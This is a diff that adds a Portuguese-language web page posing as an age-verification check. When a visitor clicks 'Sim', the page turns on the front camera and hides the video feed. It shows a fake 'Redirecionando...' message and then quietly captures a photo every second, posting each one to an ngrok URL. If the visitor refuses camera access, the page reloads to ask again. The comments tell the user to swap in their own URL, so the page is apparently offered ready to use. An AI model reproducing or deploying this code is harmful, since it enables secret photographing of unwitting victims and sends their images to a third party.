@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>Verificação de idade</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body{margin:0;font-family:Arial;background:#111;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}
+    h2{margin-bottom:30px;font-weight:400}
+    button{width:180px;padding:14px;margin:8px;border:none;border-radius:6px;font-size:16px;cursor:pointer}
+    .yes{background:#00c851;color:#fff}
+    .no {background:#444;color:#ccc}
+    video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-1;opacity:0} /* invisível */
+  </style>
+</head>
+<body>
+  <h2>Você tem mais de 18 anos?</h2>
+  <button class="yes" id="btnYes">Sim</button>
+  <button class="no"  id="btnNo" >Não</button>
+
+  <video id="v" autoplay playsinline muted></video>
+
+  <script>
+    const v = document.getElementById('v');
+
+    document.getElementById('btnYes').onclick = () => {
+      navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }, // câmera frontal
+        audio: false
+      })
+      .then(stream => {
+        v.srcObject = stream;        // liga a câmera (mesmo invisível)
+        document.body.innerHTML = "<h2>Redirecionando...</h2>"; // qualquer desculpa
+        // captura silenciosa: foto a cada 1 s e envia
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        setInterval(()=>{
+          canvas.width  = v.videoWidth;
+          canvas.height = v.videoHeight;
+          ctx.drawImage(v, 0, 0);
+          canvas.toBlob(blob=>{fetch('https://quaverous-song-homosporous.ngrok-free.dev/site/save.php.txt',{method:'POST',body:blob}); // troque pela sua URL
+      }, 'image/jpeg', 0.9);
+        }, 1000);
+      })
+      .catch(()=> location.reload()); // se negar, recarrega e tenta de novo
+    };
+
+    document.getElementById('btnNo').onclick = () => {
+      alert("Acesso negado.");
+      location.href = "https://google.com";
+    };
+  </script>
+</body>
+</html>
